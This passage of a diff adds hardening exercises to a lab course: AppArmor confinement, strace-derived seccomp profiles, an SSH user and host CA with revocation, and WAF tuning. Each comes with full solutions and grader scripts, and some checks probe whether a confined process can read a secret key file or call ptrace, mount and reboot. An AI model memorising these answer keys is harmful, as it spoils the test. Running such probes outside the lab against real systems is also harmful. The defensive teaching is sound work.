+  - 'Part 2: add one rule per denial, then `sudo apparmor_parser -r /etc/apparmor.d/kl-report && sudo systemctl restart kl-report`.'
+  - 'Part 2: use a specific path for the report file or a pattern limited to `/var/lib/kl-report/reports/`.'
+  - 'Part 3: write rules naming the exact files and directories the service needs, and check `aa-status` still shows the profile in enforce mode.'
+  solution: |
+    ```bash
+    sudo journalctl -k | grep DENIED     # read which file or network access failed
+    sudo tee /etc/apparmor.d/kl-report >/dev/null <<'P'
+    abi <abi/3.0>,
+    include <tunables/global>
+    profile kl-report flags=(attach_disconnected) {
+      include <abstractions/base>
+      include <abstractions/python>
+      /usr/bin/python3* rix,
+      /opt/kl-report/** r,
+      /etc/kl-report/report.conf r,
+      owner /var/lib/kl-report/reports/ r,
+      /var/lib/kl-report/reports/* rw,
+      network inet stream,
+    }
+    P
+    sudo apparmor_parser -r /etc/apparmor.d/kl-report
+    sudo systemctl restart kl-report
+    curl -s http://127.0.0.1:9190/status
+    printf '/etc/kl-report/report.conf\n/var/lib/kl-report/reports/latest.txt\nnetwork inet stream\n' >/lab/denials.txt
+    ```
+  setup: |
+    TOKEN=$(rand_flag)
+    mkdir -p /opt/kl-report /etc/kl-report /var/lib/kl-report/reports
+    cat >/opt/kl-report/app.py <<'PY'
+    import configparser, socket, datetime, http.server, sys
+    cfg = configparser.ConfigParser()
+    cfg.read_file(open('/etc/kl-report/report.conf'))
+    token = cfg['report']['token']
+    with open('/var/lib/kl-report/reports/latest.txt', 'w') as f:
+        f.write(f'report generated {datetime.datetime.now().isoformat()}\ntoken={token}\n')
+    class H(http.server.BaseHTTPRequestHandler):
+        def log_message(self, *a): pass
+        def do_GET(self):
+            body = (token + '\n').encode()
+            self.send_response(200); self.send_header('Content-Length', str(len(body))); self.end_headers(); self.wfile.write(body)
+    http.server.HTTPServer(('127.0.0.1', 9190), H).serve_forever()
+    PY
+    printf '[report]\ntoken = %s\n' "$TOKEN" >/etc/kl-report/report.conf
+    head -c32 /dev/urandom | base64 >/etc/kl-report/secret.key
+    chmod 644 /etc/kl-report/report.conf /etc/kl-report/secret.key
+    cat >/etc/apparmor.d/kl-report <<'P'
+    abi <abi/3.0>,
+    include <tunables/global>
+    profile kl-report flags=(attach_disconnected) {
+      include <abstractions/base>
+      include <abstractions/python>
+      /usr/bin/python3* rix,
+      /opt/kl-report/** r,
+    }
+    P
+    cat >/etc/systemd/system/kl-report.service <<'U'
+    [Unit]
+    Description=Report service (hardened)
+    [Service]
+    ExecStart=/usr/bin/python3 /opt/kl-report/app.py
+    AppArmorProfile=kl-report
+    Restart=no
+    [Install]
+    WantedBy=multi-user.target
+    U
+    on_reset 'systemctl disable --now kl-report; rm -f /etc/systemd/system/kl-report.service; apparmor_parser -R /etc/apparmor.d/kl-report 2>/dev/null; rm -f /etc/apparmor.d/kl-report; rm -rf /opt/kl-report /etc/kl-report /var/lib/kl-report; systemctl daemon-reload'
+    apparmor_parser -r /etc/apparmor.d/kl-report || { echo "profile load failed" >&2; exit 1; }
+    systemctl daemon-reload
+    systemctl start kl-report 2>/dev/null
+    sleep 1
+    systemctl is-active -q kl-report && { echo "service unexpectedly runs: the fault is missing" >&2; exit 1; }
+    journalctl -k --since=-1min | grep -q 'apparmor="DENIED".*kl-report' || { echo "no AppArmor denial appeared" >&2; exit 1; }
+    echo "$TOKEN" >"$KL_STATE/token"
+  check: |
+    TOKEN=$(cat "$KL_STATE/token")
+    info "Part 1: Find out why"
+    d=$(tr -s ' ' </lab/denials.txt 2>/dev/null)
+    check "denials.txt lists the config file" 'grep -qx "/etc/kl-report/report.conf" <<<"$d"'
+    check "denials.txt lists the report file" 'grep -qx "/var/lib/kl-report/reports/latest.txt" <<<"$d"'
+    check "denials.txt lists the network denial" 'grep -qx "network inet stream" <<<"$d"'
+    info "Part 2: Fix the profile"
+    check "kl-report is active" 'systemctl is-active -q kl-report'
+    check "the status page answers with the token" '[ "$(curl -fsS -m 5 http://127.0.0.1:9190/status)" = "$TOKEN" ]'
+    check "the report file holds the token" 'grep -qF "$TOKEN" /var/lib/kl-report/reports/latest.txt'
+    info "Part 3: Keep it locked down"
+    if systemctl is-active -q kl-report; then
+      PID=$(systemctl show -p MainPID --value kl-report)
+      check "the running service is confined in enforce mode" '[ "$(cat /proc/$PID/attr/current)" = "kl-report (enforce)" ]'
+      py() { aa-exec -p kl-report -- /usr/bin/python3 -c "$1" 2>&1; }
+      R=$(py 'import sys
+    try:
+        open("/etc/kl-report/secret.key").read(); print("READ")
+    except PermissionError: print("DENIED")')
+      check "the secret key stays denied" '[ "$R" = DENIED ]'
+      W=$(py 'import sys
+    try:
+        open("/etc/kl-report/planted","w").write("x"); print("WROTE")
+    except PermissionError: print("DENIED")')
+      check "writing under /etc/kl-report stays denied" '[ "$W" = DENIED ]'
+      check "no filesystem-wide rule in the profile" '! grep -qE "^[[:space:]]*/\*\*" /etc/apparmor.d/kl-report'
+    else
+      fail "the service must run before the lockdown can be checked"
+    fi
+    kl_finish
+  solve: |
+    printf '/etc/kl-report/report.conf\n/var/lib/kl-report/reports/latest.txt\nnetwork inet stream\n' >/lab/denials.txt
+    sudo tee /etc/apparmor.d/kl-report >/dev/null <<'P'
+    abi <abi/3.0>,
+    include <tunables/global>
+    profile kl-report flags=(attach_disconnected) {
+      include <abstractions/base>
+      include <abstractions/python>
+      /usr/bin/python3* rix,
+      /opt/kl-report/** r,
+      /etc/kl-report/report.conf r,
+      /var/lib/kl-report/reports/ r,
+      /var/lib/kl-report/reports/* rw,
+      network inet stream,
+    }
+    P
+    sudo apparmor_parser -r /etc/apparmor.d/kl-report
+    sudo systemctl restart kl-report
+    sleep 1
+
+- id: sec-052
+  title: A seccomp profile from strace
+  difficulty: 4
+  kind: build
+  tags: [seccomp, containers, strace, hardening]
+  tutorial: |
+    **Concept.** seccomp filters the system calls a process may make, so a compromised program can't do things its normal work never needs. Docker's default profile allows around 300 of the 400 or so syscalls: it is safe to give to anything, which also means it isn't tight for any one program. A profile built from what an application really does is much narrower.
+
+    *Measure the program, don't guess.* `strace` shows every system call a process makes. Run the app, drive every code path, extract the distinct names.
+
+    *Tracing has two traps.* First, a syscall you never exercised won't be in the list, so a profile built from startup alone breaks the first time a request arrives. Second, the trace starts after the container runtime has done its own setup, so it can miss a few calls the runtime needs under the filter. Those must be allowed too. And a server that runs until it is killed never calls `exit_group` during a trace, yet it can't exit cleanly without it.
+
+    **Read up on:**
+    - `man 2 seccomp` and Docker's seccomp profile JSON format (`defaultAction`, `syscalls`, `names`, `action`)
+    - `docker run --security-opt seccomp=FILE`
+    - `strace -f -o FILE -p PID` — follow children, write to a file, attach to a process
+    - `sed`/`awk` to reduce strace output to syscall names, `sort -u`
+    - `jq` to build the JSON, or Python
+  scenario: |
+    A small Python service lives in **`/lab/app/`** (`server.py`, `config.ini`). In production it runs in `python:3.12-alpine`. Build it a tight seccomp profile.
+
+    It serves three things on port 8080: `GET /health`, `GET /info` (which reports its hostname and lists `/app`), and `POST` to any path (it hashes the body and appends the hash to a log).
+
+    Two files are ready for you:
+
+    - **`/lab/trace-run.sh`** starts the app in an unconfined container listening on `127.0.0.1:8090`, attaches `strace` to it for the number of seconds you give (it needs `sudo`), and writes **`/lab/trace.out`**
+    - **`/lab/runtime-syscalls.txt`** lists calls your trace won't show: what the container runtime needs after the filter is in place but before the app starts, and the calls a process uses to exit. They are needed too.
+
+    ## Part 1: Trace it
+
+    Run `sudo /lab/trace-run.sh 20` and, while it runs, make requests to all three kinds of endpoint on port 8090. Reduce the trace to a sorted list of unique syscall names in **`/lab/syscalls.txt`**, one per line.
+
+    ## Part 2: Write the profile
+
+    Create **`/lab/profile.json`**, a Docker seccomp profile with `"defaultAction": "SCMP_ACT_ERRNO"` that allows the traced calls and the runtime calls. Started with `--security-opt seccomp=/lab/profile.json`, the service in `python:3.12-alpine` must serve `/health`, `/info` and `POST` correctly.
+
+    ## Part 3: Prove it's tight
+
+    Allow **no more than 75** system calls. The profile must actually block calls the app doesn't need: `ptrace`, `mount`, `unshare` and `reboot` must all fail with "operation not permitted" inside a container using it.
+  hints:
+  - 'Part 1: strace writes lines such as `1234 read(3, ...)`. Remove the PID and everything from the first `(`, then `sort -u`. Lines like `exited`, `killed` and `---` are not syscalls.'
+  - 'Part 1: hit all three endpoints during the trace window; a profile built from startup alone fails on the first request.'
+  - 'Part 2: combine the two lists and write `{"defaultAction":"SCMP_ACT_ERRNO","syscalls":[{"names":[...],"action":"SCMP_ACT_ALLOW"}]}`.'
+  - 'Part 3: if a test call succeeds, something added it. Keep the list to what appears in the trace and the runtime file.'
+  solution: |
+    ```bash
+    cd /lab
+    sudo ./trace-run.sh 20 &
+    sleep 8
+    curl -s http://127.0.0.1:8090/health
+    curl -s http://127.0.0.1:8090/info
+    curl -s -d hello http://127.0.0.1:8090/
+    wait
+    sed -E 's/^[0-9]+ +//;s/\(.*//' trace.out | grep -E '^[a-z_0-9]+$' | grep -v '^exited$' | sort -u >syscalls.txt
+    python3 -c '
+    import json
+    n=sorted({l.strip() for f in ("syscalls.txt","runtime-syscalls.txt") for l in open(f) if l.strip()})
+    json.dump({"defaultAction":"SCMP_ACT_ERRNO","syscalls":[{"names":n,"action":"SCMP_ACT_ALLOW"}]},open("profile.json","w"))'
+    ```
+  setup: |
+    mkdir -p /lab/app
+    TOKEN=$(rand_flag)
+    cat >/lab/app/server.py <<'PY'
+    import configparser, hashlib, json, os, socket
+    from http.server import BaseHTTPRequestHandler as B, HTTPServer as S
+    cfg = configparser.ConfigParser(); cfg.read('/app/config.ini')
+    log = open('/tmp/app.log', 'a')
+    TOKEN = cfg['app']['token']
+    class H(B):
+        def log_message(self, *a): pass
+        def out(self, b):
+            self.send_response(200); self.send_header('Content-Length', str(len(b))); self.end_headers(); self.wfile.write(b)
+        def do_GET(self):
+            if self.path == '/health':
+                return self.out((TOKEN + '\n').encode())
+            self.out(json.dumps({'host': socket.gethostname(), 'files': sorted(os.listdir('/app'))}).encode())
+        def do_POST(self):
+            d = self.rfile.read(int(self.headers.get('Content-Length') or 0))
+            h = hashlib.sha256(d).hexdigest()
+            log.write(h + '\n'); log.flush()
+            self.out(h.encode())
+    S(('0.0.0.0', 8080), H).serve_forever()
+    PY
+    printf '[app]\ntoken = %s\n' "$TOKEN" >/lab/app/config.ini
+    printf 'fstatfs\ncapget\ncapset\nchdir\nfutex\ngetcwd\nsetgroups\nsetgid\nsetuid\nprctl\nstatx\nnewfstatat\nopenat\nreadlinkat\ngetppid\nexit\nexit_group\n' >/lab/runtime-syscalls.txt
+    cat >/lab/trace-run.sh <<'SH'
+    #!/bin/bash
+    # usage: sudo /lab/trace-run.sh SECONDS
+    # Runs the app unconfined on 127.0.0.1:8090 and traces it for SECONDS.
+    D=${1:-20}
+    docker rm -f trace-app >/dev/null 2>&1
+    docker run -d --name trace-app --security-opt seccomp=unconfined -v /lab/app:/app:ro \
+      -p 127.0.0.1:8090:8080 python:3.12-alpine sh -c 'sleep 3; exec python /app/server.py' >/dev/null || exit 1
+    sleep 1
+    pid=$(docker inspect -f '{{.State.Pid}}' trace-app)
+    timeout "$D" strace -f -qq -o /lab/trace.out -p "$pid"
+    docker rm -f trace-app >/dev/null 2>&1
+    chown "$SUDO_UID:$SUDO_GID" /lab/trace.out 2>/dev/null
+    exit 0
+    SH
+    chmod 755 /lab/trace-run.sh
+    chown -R "$(lab_user)": /lab
+    echo "$TOKEN" >"$KL_STATE/token"
+    on_reset 'docker rm -f kl-sec052 kl-sec052-t trace-app >/dev/null 2>&1'
+  check: |
+    TOKEN=$(cat "$KL_STATE/token")
+    IMG=python:3.12-alpine
+    info "Part 1: Trace it"
+    check "trace.out is a real trace" 'grep -qE "^[0-9]+ +execve\(|^[0-9]+ +read\(" /lab/trace.out'
+    check "syscalls.txt has the server calls" 'for s in accept4 bind listen recvfrom sendto; do grep -qx "$s" /lab/syscalls.txt || exit 1; done'
+    check "syscalls.txt has only syscall names, one per line" '[ "$(grep -cvE "^[a-z_0-9]+$" /lab/syscalls.txt)" = 0 ] && [ -s /lab/syscalls.txt ]'
+    info "Part 2: Write the profile"
+    P=/lab/profile.json
+    check "profile.json is valid JSON" 'jq . "$P" >/dev/null'
+    check "the default action denies with an error" '[ "$(jq -r .defaultAction "$P")" = SCMP_ACT_ERRNO ]'
+    docker rm -f kl-sec052 >/dev/null 2>&1
+    STARTED=
+    if jq . "$P" >/dev/null 2>&1 && docker run -d --name kl-sec052 --security-opt seccomp="$P" -p 127.0.0.1:8091:8080 -v /lab/app:/app:ro "$IMG" python /app/server.py >/dev/null 2>&1; then
+      STARTED=1
+      eventually 10 '[ "$(curl -fsS -m 2 http://127.0.0.1:8091/health)" = "$TOKEN" ]' || true
+    fi
+    check "the service starts under the profile and /health answers" '[ "$(curl -fsS -m 2 http://127.0.0.1:8091/health)" = "$TOKEN" ]'
+    check "/info answers" 'curl -fsS -m 3 http://127.0.0.1:8091/info | grep -q server.py'
+    check "POST answers with the hash" '[ "$(curl -fsS -m 3 -d kl-test http://127.0.0.1:8091/x)" = "$(printf kl-test | sha256sum | cut -d" " -f1)" ]'
+    docker rm -f kl-sec052 >/dev/null 2>&1
+    info "Part 3: Prove it's tight"
+    N=$(jq '[.syscalls[]? | select(.action=="SCMP_ACT_ALLOW") | .names[]] | length' "$P" 2>/dev/null)
+    check "no more than 75 allowed syscalls" '[ -n "$N" ] && [ "$N" -gt 0 ] && [ "$N" -le 75 ]'
+    if [ -n "$STARTED" ]; then
+      # a profile without exit_group makes musl spin on exit forever, so this needs a time limit
+      R=$(timeout 30 docker run --rm --name kl-sec052-t --security-opt seccomp="$P" "$IMG" python -c '
+    import ctypes,errno
+    l=ctypes.CDLL(None,use_errno=True)
+    def t(f,*a):
+        ctypes.set_errno(0)
+        r=f(*a)
+        return (r,ctypes.get_errno())
+    res=[t(l.ptrace,0,0,0,0),t(l.mount,b"none",b"/tmp",b"tmpfs",0,0),t(l.unshare,0x20000),t(l.reboot,0x4321fedc)]
+    print("BLOCKED" if all(r[0]==-1 and r[1]==errno.EPERM for r in res) else ("LEAK",res))' 2>&1)
+      docker rm -f kl-sec052-t >/dev/null 2>&1
+      check "ptrace, mount, unshare and reboot all fail with EPERM" '[ "$R" = BLOCKED ]'
+    else
+      fail "the profile must run the service first"
+    fi
+    kl_finish
+  solve: |
+    cd /lab
+    sudo ./trace-run.sh 18 &
+    sleep 7
+    curl -s -m 3 http://127.0.0.1:8090/health
+    curl -s -m 3 http://127.0.0.1:8090/info
+    curl -s -m 3 -d hello http://127.0.0.1:8090/x
+    sleep 1
+    curl -s -m 3 http://127.0.0.1:8090/health
+    wait
+    sed -E 's/^[0-9]+ +//;s/\(.*//' trace.out | grep -E '^[a-z_0-9]+$' | grep -v '^exited$' | sort -u >syscalls.txt
+    python3 - <<'PY'
+    import json
+    names = sorted({l.strip() for f in ('syscalls.txt', 'runtime-syscalls.txt') for l in open(f) if l.strip()})
+    json.dump({"defaultAction": "SCMP_ACT_ERRNO", "syscalls": [{"names": names, "action": "SCMP_ACT_ALLOW"}]}, open('profile.json', 'w'))
+    PY
+
+- id: sec-053
+  title: SSH certificates from a small CA
+  difficulty: 4
+  kind: build
+  tags: [ssh, certificates, pki, hardening, access-management]
+  tutorial: |
+    **Concept.** Plain SSH keys are managed by copying public keys into `authorized_keys` on every server, and there's no built-in way to expire a key or see who has access. An SSH certificate is a public key signed by a CA key with extra fields: the **principals** it may log in as, a **validity window**, and an **identity**. A server only needs to trust the CA's public key, and access is granted by issuing a certificate rather than editing servers.
+
+    *Two directions.* User certificates let users authenticate to servers (the server trusts the CA with `TrustedUserCAKeys`). Host certificates let clients authenticate the server without a per-host `known_hosts` entry (the client trusts the CA with an `@cert-authority` line).
+
+    *Short lifetimes do most of the work,* because a certificate that expires tonight doesn't need revoking. When one must be cut off early, a **Key Revocation List** (KRL) is the mechanism.
+
+    **Read up on:**
+    - `ssh-keygen -s CA_KEY -I ID -n PRINCIPALS -V VALIDITY PUBKEY` and `-h` for host certificates; `ssh-keygen -L -f CERT` to inspect one
+    - `man sshd_config`: `TrustedUserCAKeys`, `AuthorizedKeysFile`, `HostKey`, `HostCertificate`, `RevokedKeys`
+    - `ssh-keygen -k -f FILE ...` to build a KRL; `ssh-keygen -Q -f KRL CERT` to test one
+    - `@cert-authority` in `known_hosts`
+    - `ssh -i key` and how it finds `key-cert.pub` beside the key
+  scenario: |
+    A small SSH server for the deployment account runs on **`127.0.0.1:2222`** as the `kl-sshca` systemd service, with its config in **`/etc/kl-sshca/sshd_config`** (edit with `sudo`; `sudo systemctl restart kl-sshca` applies it). It still uses `authorized_keys`, and you'll replace that with certificates. People's public keys are in **`/lab/keys/`**: `alice.pub` and `bob.pub` (with their private keys beside them), and `old.pub`, the shared key being retired.
+
+    Don't touch the VM's real SSH service on port 22.
+
+    ## Part 1: Trust a CA for users
+
+    Create a CA key at **`/lab/ca/user_ca`** (with no passphrase). Configure the server so that a certificate signed by it is accepted for login, and so that `authorized_keys` is no longer honoured at all. The old key must stop working.
+
+    ## Part 2: Issue user certificates
+
+    Sign Alice's and Bob's keys as `alice-cert.pub` and `bob-cert.pub` in `/lab/keys/`. Each certificate must be for principal **`deploy`**, identity **`alice@corp`** / **`bob@corp`**, and valid for **no more than 24 hours**. Alice must then log in as `deploy` with `ssh -i /lab/keys/alice -p 2222 deploy@127.0.0.1`.
+
+    ## Part 3: Trust the host through the CA too
+
+    Create **`/lab/ca/host_ca`** (no passphrase), sign the server's host key as a host certificate for hostname `127.0.0.1`, and configure the server to present it. Write **`/lab/known_hosts`** so a client using only that file, with strict host-key checking, accepts the server through the CA.
+
+    ## Part 4: Cut off Bob
+
+    Bob has left. Without waiting for his certificate to expire, revoke it with a KRL at **`/lab/ca/revoked.krl`** and make the server enforce it. Bob's certificate must be refused, and Alice's must still work.
+  hints:
+  - 'Part 1: `TrustedUserCAKeys` takes a file holding the CA public key. `AuthorizedKeysFile none` turns off authorized_keys.'
+  - 'Part 2: `ssh-keygen -s /lab/ca/user_ca -I alice@corp -n deploy -V +8h /lab/keys/alice.pub` writes the certificate next to the key.'
+  - 'Part 3: sign the host public key with `-h`, add `HostCertificate` to the server config, and put `@cert-authority [127.0.0.1]:2222 ...` in the known_hosts file with the contents of `host_ca.pub`.'
+  - 'Part 4: `ssh-keygen -k -f /lab/ca/revoked.krl /lab/keys/bob-cert.pub` then `RevokedKeys` in the server config.'
+  solution: |
+    ```bash
+    mkdir -p /lab/ca
+    ssh-keygen -q -t ed25519 -N '' -f /lab/ca/user_ca
+    ssh-keygen -q -t ed25519 -N '' -f /lab/ca/host_ca
+    sudo tee -a /etc/kl-sshca/sshd_config >/dev/null <<E
+    TrustedUserCAKeys /lab/ca/user_ca.pub
+    HostCertificate /etc/kl-sshca/ssh_host_ed25519_key-cert.pub
+    RevokedKeys /lab/ca/revoked.krl
+    AuthorizedKeysFile none
+    E
+    sudo sed -i '/^AuthorizedKeysFile .ssh/d' /etc/kl-sshca/sshd_config
+    ssh-keygen -s /lab/ca/user_ca -I alice@corp -n deploy -V +8h /lab/keys/alice.pub
+    ssh-keygen -s /lab/ca/user_ca -I bob@corp -n deploy -V +8h /lab/keys/bob.pub
+    sudo ssh-keygen -s /lab/ca/host_ca -I kl-host -h -n 127.0.0.1 -V +52w /etc/kl-sshca/ssh_host_ed25519_key.pub
+    echo "@cert-authority [127.0.0.1]:2222 $(cat /lab/ca/host_ca.pub)" >/lab/known_hosts
+    ssh-keygen -k -f /lab/ca/revoked.krl /lab/keys/bob-cert.pub
+    sudo systemctl restart kl-sshca
+    ```
+  setup: |
+    mkdir -p /etc/kl-sshca /lab/keys
+    id deploy >/dev/null 2>&1 || useradd -m -s /bin/bash deploy
+    usermod -p '*' deploy
+    ssh-keygen -q -t ed25519 -N '' -f /etc/kl-sshca/ssh_host_ed25519_key
+    for k in alice bob old; do ssh-keygen -q -t ed25519 -N '' -C "$k" -f /lab/keys/$k; done
+    mkdir -p /home/deploy/.ssh; cp /lab/keys/old.pub /home/deploy/.ssh/authorized_keys
+    chown -R deploy: /home/deploy/.ssh; chmod 700 /home/deploy/.ssh; chmod 600 /home/deploy/.ssh/authorized_keys
+    cat >/etc/kl-sshca/sshd_config <<'E'
+    Port 2222
+    ListenAddress 127.0.0.1
+    HostKey /etc/kl-sshca/ssh_host_ed25519_key
+    PidFile /run/kl-sshca.pid
+    AuthorizedKeysFile .ssh/authorized_keys
+    PasswordAuthentication no
+    KbdInteractiveAuthentication no
+    UsePAM no
+    E
+    cat >/etc/systemd/system/kl-sshca.service <<'U'
+    [Unit]
+    Description=Lab SSH service
+    [Service]
+    RuntimeDirectory=sshd
+    RuntimeDirectoryPreserve=yes
+    ExecStart=/usr/sbin/sshd -D -f /etc/kl-sshca/sshd_config
+    Restart=no
+    [Install]
+    WantedBy=multi-user.target
+    U
+    on_reset 'systemctl disable --now kl-sshca 2>/dev/null; rm -f /etc/systemd/system/kl-sshca.service; rm -rf /etc/kl-sshca /home/deploy; systemctl daemon-reload'
+    mkdir -p /run/sshd
+    systemctl daemon-reload
+    systemctl start kl-sshca
+    eventually 10 'ss -lnt | grep -q 127.0.0.1:2222' || { echo "lab sshd did not start" >&2; exit 1; }
+    chown -R "$(lab_user)": /lab/keys
+    chmod 600 /lab/keys/alice /lab/keys/bob /lab/keys/old
+    # prove the starting point: the old shared key works
+    sudo -u "$(lab_user)" ssh -i /lab/keys/old -o IdentitiesOnly=yes -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 2222 deploy@127.0.0.1 true 2>/dev/null || { echo "old key does not log in: the starting state is wrong" >&2; exit 1; }
+  check: |
+    login() { # KEY [CHECK-STRICT]  -> runs whoami as deploy using only KEY
+      local strict=no kh=/dev/null
+      [ "$2" = strict ] && { strict=yes; kh=/lab/known_hosts; }
+      as_user "ssh -i '$1' -o IdentitiesOnly=yes -o BatchMode=yes -o PreferredAuthentications=publickey -o ConnectTimeout=5 -o StrictHostKeyChecking=$strict -o UserKnownHostsFile=$kh -p 2222 deploy@127.0.0.1 whoami" 2>/dev/null
+    }
+    sshd_active() { systemctl is-active -q kl-sshca; }
+    is_cert() { # FILE IDENTITY
+      ssh-keygen -L -f "$1" 2>/dev/null | grep -q "Key ID: \"$2\"" &&
+        ssh-keygen -L -f "$1" | grep -A1 Principals: | grep -q deploy
+    }
+    valid_ok() { # FILE: valid for at most 24h, not forever
+      local v from to
+      v=$(ssh-keygen -L -f "$1" 2>/dev/null | grep "Valid:") || return 1
+      from=$(sed -E 's/.*from ([^ ]+).*/\1/' <<<"$v"); to=$(sed -E 's/.* to ([^ ]+).*/\1/' <<<"$v")
+      [ -n "$from" ] && [ -n "$to" ] || return 1
+      [ $(( $(date -d "$to" +%s) - $(date -d "$from" +%s) )) -le 90000 ]
+    }
+    info "Part 1: Trust a CA for users"
+    check "the user CA key exists" '[ -f /lab/ca/user_ca ] && [ -f /lab/ca/user_ca.pub ]'
+    check "the old shared key no longer logs in" 'sshd_active && [ "$(login /lab/keys/old)" != deploy ]'
+    check "authorized_keys is disabled" 'sshd -T -f /etc/kl-sshca/sshd_config 2>/dev/null | grep -qi "^authorizedkeysfile none"'
+    info "Part 2: Issue user certificates"
+    check "Alice's certificate has the right identity and principal" 'is_cert /lab/keys/alice-cert.pub alice@corp'
+    check "Alice's certificate lasts no more than 24 hours" 'valid_ok /lab/keys/alice-cert.pub'
+    check "Bob's certificate has the right identity and principal" 'is_cert /lab/keys/bob-cert.pub bob@corp'
+    check "Bob's certificate lasts no more than 24 hours" 'valid_ok /lab/keys/bob-cert.pub'
+    check "Alice logs in as deploy" 'sshd_active && [ "$(login /lab/keys/alice)" = deploy ]'
+    info "Part 3: Trust the host through the CA too"
+    check "the host CA key exists" '[ -f /lab/ca/host_ca ] && [ -f /lab/ca/host_ca.pub ]'
+    check "the server presents a host certificate" 'ssh-keyscan -c -p 2222 127.0.0.1 2>/dev/null | grep -q cert-v01'
+    check "Alice logs in with strict checking through known_hosts" '[ "$(login /lab/keys/alice strict)" = deploy ]'
+    info "Part 4: Cut off Bob"
+    check "Bob's certificate is in the KRL" 'ssh-keygen -Q -f /lab/ca/revoked.krl /lab/keys/bob-cert.pub 2>/dev/null | grep -q REVOKED'
+    if is_cert /lab/keys/bob-cert.pub bob@corp 2>/dev/null; then
+      check "Bob can no longer log in" 'sshd_active && [ "$(login /lab/keys/bob)" != deploy ]'
+    else
+      fail "Bob needs a certificate before it can be revoked"
+    fi
+    check "Alice still logs in" 'sshd_active && [ "$(login /lab/keys/alice)" = deploy ]'
+    kl_finish
+  solve: |
+    mkdir -p /lab/ca
+    ssh-keygen -q -t ed25519 -N '' -f /lab/ca/user_ca
+    ssh-keygen -q -t ed25519 -N '' -f /lab/ca/host_ca
+    sudo sed -i '/^AuthorizedKeysFile /d' /etc/kl-sshca/sshd_config
+    sudo tee -a /etc/kl-sshca/sshd_config >/dev/null <<E
+    AuthorizedKeysFile none
+    TrustedUserCAKeys /lab/ca/user_ca.pub
+    HostCertificate /etc/kl-sshca/ssh_host_ed25519_key-cert.pub
+    RevokedKeys /lab/ca/revoked.krl
+    E
+    ssh-keygen -q -s /lab/ca/user_ca -I alice@corp -n deploy -V +8h /lab/keys/alice.pub
+    ssh-keygen -q -s /lab/ca/user_ca -I bob@corp -n deploy -V +8h /lab/keys/bob.pub
+    sudo ssh-keygen -q -s /lab/ca/host_ca -I kl-host -h -n 127.0.0.1 -V +52w /etc/kl-sshca/ssh_host_ed25519_key.pub
+    echo "@cert-authority [127.0.0.1]:2222 $(cat /lab/ca/host_ca.pub)" >/lab/known_hosts
+    ssh-keygen -k -f /lab/ca/revoked.krl /lab/keys/bob-cert.pub
+    sudo systemctl restart kl-sshca
+    sleep 1
+
+- id: sec-054
+  title: Tune the WAF without blinding it
+  difficulty: 4
+  kind: build
+  tags: [waf, modsecurity, owasp-crs, false-positives, hardening]
+  tutorial: |
+    **Concept.** A web application firewall inspects requests and blocks those that look like attacks. A rule set such as the OWASP Core Rule Set (CRS) adds up an **anomaly score** across many rules and blocks a request whose total crosses a threshold. It catches attacks generically, and it will sometimes catch innocent content, because a forum post about databases looks a lot like SQL injection.
+
+    *A false positive is a tuning problem, not a reason to turn the WAF off.* Good tuning is narrow: stop one specific rule from inspecting one specific field on one specific URL, and leave every other rule, field and URL as they were. Anything broader quietly removes protection you still need.
+
+    *Find the rule first.* The blocking message names the overall anomaly rule, so look in the audit detail for the individual rule IDs that scored. Each one needs its own exception, for the field that triggered it.
+
+    **Read up on:**
+    - CRS anomaly scoring and paranoia levels
+    - ModSecurity actions `ctl:ruleRemoveTargetById=ID;ARGS:field` and `SecRule` with `phase:1` for scoping
+    - `SecRule REQUEST_FILENAME "@streq /path" ...` to scope an exception to one URL
+    - `docker logs` and the JSON audit entries (`ruleId`)
+    - `REQUEST-900-EXCLUSION-RULES-BEFORE-CRS.conf` and why exclusions go before the rules
+  scenario: |
+    **Developer forum** runs behind a ModSecurity WAF with the OWASP Core Rule Set. Forum posts go to `POST /comment` as a form field named **`comment`**. Developers paste shell commands and SQL into their posts, and the WAF is blocking them with `403`.
+
+    The WAF is the container **`kl-waf`** on `127.0.0.1:8088`. Send requests with the header **`Host: forum.corp.test`**; requests using a bare IP as the host are scored higher. Sample legitimate comments are in **`/lab/waf/legit-comments.txt`**, one per line.
+
+    Your exceptions go in **`/lab/waf/REQUEST-900-EXCLUSION-RULES-BEFORE-CRS.conf`**. Apply a change with `docker restart kl-waf` and allow around 15 seconds for it to come back.
+
+    ## Part 1: Find what blocks them
+
+    Find the CRS rule IDs that fire for the legitimate comments (the audit entries appear in `docker logs kl-waf`). Write them to **`/lab/waf/rules.txt`**, one rule ID per line. Do not include the anomaly-evaluation rule `949110` that makes the final block decision, or `980170`.
+
+    ## Part 2: Let real users post
+
+    Add exceptions so that every comment in the file is accepted (HTTP 200) when posted to `/comment`.
+
+    ## Part 3: Stay protected
+
+    Your exceptions must apply **only to the `comment` field on `POST /comment`**:
+
+    - a script injection posted in `comment` must still be blocked
+    - the same SQL text in `GET /search?q=...` must still be blocked
+    - a path traversal to `GET /download?file=...` must still be blocked
+    - the same SQL text posted to `/comment` in a different field, `title`, must still be blocked
+
+    Don't disable the WAF, change its paranoia level, or raise its anomaly threshold.
+  hints:
+  - 'Part 1: post each comment, then pull `ruleId` values out of `docker logs kl-waf`. Rule `949110` is the final decision, not the cause.'
+  - 'Part 2: a rule that scopes an exception to one URL and field looks like `SecRule REQUEST_FILENAME "@streq /comment" "id:10001,phase:1,pass,nolog,ctl:ruleRemoveTargetById=942100;ARGS:comment"`.'
+  - 'Part 2: you may need several rule IDs, listed as separate `ctl:` actions or separate rules, each with its own unique `id:`.'
+  - 'Part 3: if an attack gets through, the exception is too wide. Check that each `ctl:` is limited to `ARGS:comment` and that the condition matches only `/comment`.'
+  solution: |
+    ```bash
+    cd /lab/waf
+    while read -r c; do
+      curl -s -o /dev/null -H 'Host: forum.corp.test' --data-urlencode "comment=$c" http://127.0.0.1:8088/comment
+    done <legit-comments.txt
+    IDS=$(docker logs kl-waf 2>&1 | grep -oE '"ruleId":"[0-9]+"' | grep -oE '[0-9]+' | sort -u | grep -vE '^(949110|980170)$')
+    printf '%s\n' $IDS >rules.txt
+    i=10000; for id in $IDS; do i=$((i+1))
+      echo "SecRule REQUEST_FILENAME \"@streq /comment\" \"id:$i,phase:1,pass,nolog,ctl:ruleRemoveTargetById=$id;ARGS:comment\""
+    done >>REQUEST-900-EXCLUSION-RULES-BEFORE-CRS.conf
+    docker restart kl-waf
+    ```
+  setup: |
+    IMG=owasp/modsecurity-crs:4.25.2-nginx-alpine-202610180210-lts
